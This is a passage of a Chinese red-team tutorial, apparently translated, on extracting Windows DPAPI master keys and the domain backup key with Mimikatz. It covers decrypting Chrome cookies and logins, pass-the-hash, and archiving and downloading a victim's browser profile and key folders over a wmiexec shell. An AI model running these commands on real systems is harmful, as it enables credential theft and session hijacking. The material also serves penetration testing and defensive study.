原文地址：
> DPAPI，全称`Data Protection Application Programming
> Interface`，作为Windows系统的一个数据保护接口被广泛使用，主要用于保护加密的数据。对于Windows系统，用户的加密数据大都采用DPAPI进行存储，而想要解密这些数据，必须要获得DPAPI对应的MasterKey。
众所周知，渗透测试或者红队攻击时，如何定义项目的目标很重要。有时仅获得域管理员权限是不够的，因为目标可能被定义为特定网段或用户个人电脑的入口，那台机器上只是保存有人家的凭据和敏感信息而已。介于此，本文特意讨论后面这种情况，详述`DPAPI`
密钥在此类攻击中的作用。
读取 `DPAPI` 密钥使得攻击者能够“横向”维持在云服务层级，无需继续访问受害者的主机。这是攻击者能够从敏感服务获取信息的另一种方式，这些敏感服务包括
`Office 365` 电子邮件服务、共享文档、团队聊天服务（如`Slack`、`Microsoft`）等。
本文重点介绍几种`DPAPI` 密钥（包括域控的 `DPAPI` 备份密钥）的读取技术。一旦获得域管理员权限，读取 `DPAPI`
密钥一般来说已经可以访问域内任何用户的秘密，无论是通过受害者的主机还是通过域控。
为了更好地讨论，定义以下场景：
  * 在目标的域环境中有已控主机。
  * 可以访问域管理员凭据和哈希（或者二者中的任意一个）。
  * 我们的目的是访问存储在谷歌浏览器中的特定用户的凭据，包括历史记录和 cookie。
基于以上情况，先来看看几种场景。第一种较为常见，控制受害者主机并在其中执行
`Mimikatz`。第二种场景提供了另一种思路：拥有访问域备份密钥的权限时，就可以控制公司域（前提是以任何方式获得域管理员权限），从而可以解密任何用户的主密钥。
## 常用方法：从系统中读取 Cookie 和机密
在第一个场景中，假设已经通过网络钓鱼或其他方式入侵了目标主机，我们的目标是获取主密钥来访问谷歌浏览器存储的凭据和cookie。为此，我们需要在受害者主机当前用户权限中执行以下
Mimikatz 命令：
    dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect
其中，`/unprotect`用于显示 cookie 值。
可以执行类似的命令来获取已保存的谷歌浏览器凭据：
    dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
使用这两个Mimikatz命令，即使是在受密码保护的用户主机上也可以解密它的主密钥。因为 Mimikatz
是以当前用户权限执行，故而这些主密钥都是可访问的。
但是，这种攻击是有局限性的，因为需要将 Mimikatz 上传到目标计算机。考虑到目标机器上可能安装了杀毒软件和端点检测和响应
(EDR)防御，就需要对应的的规避技术 。所以，只要能绕过杀软，这种攻击仍然是可行的。
关于这种方法，有几个重要的结论需要列出来：
  * Mimikatz 需要与psexec协同，但是仍然需要先将 Mimikatz 上传到目标。如果目标主机上存在防病毒软件或EDR，那上传工作就是一个难活。 
  * 如果使用psexec来执行 Mimikatz ，则无法提取谷歌浏览器的Cookie 和凭据。Mimikatz 在目标的域中需要以SYSTEM权限运行，而不是域用户权限。因此可能会收到以下错误： 
        ERROR kuhl_m_dpapi_chrome_decrypt ; No Alg and/or Key handle despite AES encryption.
如上图所提示的错误：Mimikatz
无法从内存中找到具体的键值，因为它并不在当前用户权限下运行。但是这个问题可以通过以下方式解决：由于Mimikatz已经以SYSTEM权限运行，因此可以使用
DPAPI 模块从内存中读取主密钥：
    sekurlsa::dpapi
使用上述命令，Mimikatz 可以从该特定系统的内存中获取主密钥。如果你想解密哪个用户的密钥，只需确定其键值即可。
在这个例子中，我们用户将定位于`CORE\kbell`。本例中，它的主密钥是`9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b`.
之前的命令再执行一遍，不同的是，这次可以指定主密钥：
    dpapi::chrome /in:"C:\Users\kbell\AppData\Local\Google\Chrome\User Data\Default\Cookies" 
    /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e957188​​42829b12912567ca
    0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b
有戏！我们现在可以解密 cookie 值。如果这些 cookie 有效，我们就可以劫持用户会话。
## 另辟蹊径：Mimikatz 和域控制器
上文描述的第一个场景大家应该很熟悉，但主要限制是必须将 Mimikatz 上传到目标主机。除此之外，还有一种无需上传 Mimikatz
即可执行同样功能的方法。为了实现这一点，我们需要有一台已控守的 Windows 主机（假设 Mimikatz 将在其上执行），且此主机能够访问域控。
### 以普通域用户权限打开 cmd.exe
以普通域用户权限在该受控主机上运行 Mimikatz，这其实是可行的。换言之，我们可以在未加入域的 Windows 主机上运行 Mimikatz。
首先，我们需要在域主机中打开一个cmd.exe。在本例中，用户为`core.internal\administrator`：
    runas /netonly /u:"core.internal\administrator" cmd.exe
注意：请务必记住，此方法需要密码。作为先决条件，需要先获取有效的密码。
假如无法获取明文密码，还可以使用对应的 `NTLM` 哈希值。例如，如果拥有域管理员用户的 `NTLM`
哈希值，则只需要使用mimikatz的“传递哈希”功能。这意味着你只需要 **你想要假冒的那个域用户的`NTLM` 哈希值**足矣：
    sekurlsa::pth /user:DA_ADMIN_USER /domain:FQDN.DOMAIN.LOCAL /ntlm:USER_NTLM_HASH
下例显示了如何使用 Mimikatz在域管理员用户`core.internal\administrator`里执行新的cmd.exe进程：
### 转储备份密钥
从域控导出备份密钥是可行的。首先，简要解释一下备份密钥是什么。
操作系统的多个组件使用数据保护API (Data Protection API，DPAPI)
来安全地存储密码、加密密钥或任何敏感数据。这种机制也可以用于域环境。如果在域环境中的话，用户主密钥的副本使用的是DPAPI域备份密钥进行加密，这种备份密钥是所有域控都共享的。
这意味着使用 DPAPI 域备份密钥，就可以访问任何域用户的主密钥。这就导致了攻击者能够解密存储在域中任何用户的密文。
要使用 Mimikatz 获取备份密钥，请执行以下命令：
    lsadump::backupkeys /system:DOMAIN-CONTROLLER-HOSTNAME /export
在此例中，请注意使用了`dc01.core.internal`(域控制器DC01)。
上面例子中的一个重要文件是`ntds_capi_0_116e39f3-e091-4b58-88ff-8f232466b5d6.keyx.rsa.pvk`.
`.pvk`扩展名的意思是“私钥“，表示它可以被用于解密目标用户上的秘密文件。
### 在谷歌浏览器中窃取域用户的会话
理解这种攻击的一个好方法是在真实场景中重现。首先假设我们入侵了一个名为`core.internal\kbell`的用户主机，且这台主机是公司的 IT
主管所用。由于需要压缩一些文件，因此需要上传一个可移植版本的 `7zip`。
因为我们在上一步中已经从域控中获得了备份密钥，故而在此场景中，假设我们已经拥有域管理员权限。
首先需要使用`wmiexec.py`或其他方式获得一个shell，接着上传`7za.exe` 文件：
    C:\users\kbell\desktop>put /home/rifle/Tools/windows-binaries/7za.exe .
    [*] Uploading 7za.exe to C:\users\kbell\desktop\.\7za.exe
    C:\users\kbell\desktop>dir 7za.exe
     Volume in drive C has no label.
     Volume Serial Number is 36A0-B333
     Directory of C:\users\kbell\desktop
    04/21/2020  09:17 PM         1,152,000 7za.exe
                   1 File(s)      1,152,000 bytes
                   0 Dir(s)   2,841,632,768 bytes free
接着，备份整个谷歌浏览器文件夹到一个zip文件中。此命令可能需要一些时间，具体取决于文件的大小（受害主机可能有很长的网络历史记录）：
    C:\users\kbell\desktop> 7za.exe a C:\Windows\Temp\google.zip "C:\Users\kbell\AppData\Local\Google\Chrome\User Data\"
    7-Zip (a) 19.00 (x64) : Copyright (c) 1999-2018 Igor Pavlov : 2019-02-21
    Scanning the drive:
    583 folders, 1156 files, 163464925 bytes (156 MiB)
    Creating archive: C:\Windows\Temp\google.zip
    Add new data to archive: 583 folders, 1156 files, 163464925 bytes (156 MiB)
    Files read from disk: 1156
    Archive size: 69634627 bytes (67 MiB)
    Everything is Ok
在此示例中，由于鄙人对整个文件夹都感兴趣，所以把它整个都复制了，包括书签、历史记录等。但是特别诱惑我的确是这几个文件：
    C:\Users\USERNAME\AppData\Local\Google\Chrome\User Data\Local State （这是一个文件。）
    C:\Users\USERNAME\AppData\Local\Google\Chrome\User Data\Default\*（此文件夹包含多个文件，包括Cookies文件。）
现在我们可以下载这个包含了受害主机所有 Chrome 文件的 zip 文件：
    C:\users\kbell\desktop>get C:\Windows\Temp\google.zip
    [*] Downloading C:\\Windows\Temp\google.zip
接下来，我们需要`%appdata%`目录中的密钥，位于以下路径：
    C:\Users\USERNAME\AppData\Roaming\Microsoft\Protect\SID
该`SID`代表安全标识符，例如`S-1-5-21-1968630676-249568448-1092335803-4255`。此外，此文件夹中的所有文件都是隐藏的，要用`dir
/a`才能列出它们。
先备份此文件夹，稍后会用到。
    C:\users\kbell\appdata\Roaming\Microsoft\Protect>dir /a
     Volume in drive C has no label.
     Volume Serial Number is 36A0-B333
     Directory of C:\users\kbell\appdata\Roaming\Microsoft\Protect
    04/11/2020  06:14 PM              .
    04/11/2020  06:14 PM              ..
    04/11/2020  06:14 PM                24 CREDHIST
    04/11/2020  06:14 PM              S-1-5-21-1968630676-249568448-1092335803-4255
    04/11/2020  06:14 PM                76 SYNCHIST
                   2 File(s)            100 bytes
                   3 Dir(s)   2,840,129,536 bytes free
    C:\users\kbell\appdata\Roaming\Microsoft\Protect>C:\Users\kbell\Desktop\7za.exe a 
    C:\Windows\Temp\keys.zip S-1-5-21-1968630676-249568448-1092335803-4255\
    7-Zip (a) 19.00 (x64) : Copyright (c) 1999-2018 Igor Pavlov : 2019-02-21
    Scanning the drive:
    1 folder, 3 files, 1676 bytes (2 KiB)
    Creating archive: C:\Windows\Temp\keys.zip
    Add new data to archive: 1 folder, 3 files, 1676 bytes (2 KiB)
    Files read from disk: 3
    Archive size: 2571 bytes (3 KiB)
    Everything is Ok
接着下载刚刚创建的 zip 文件：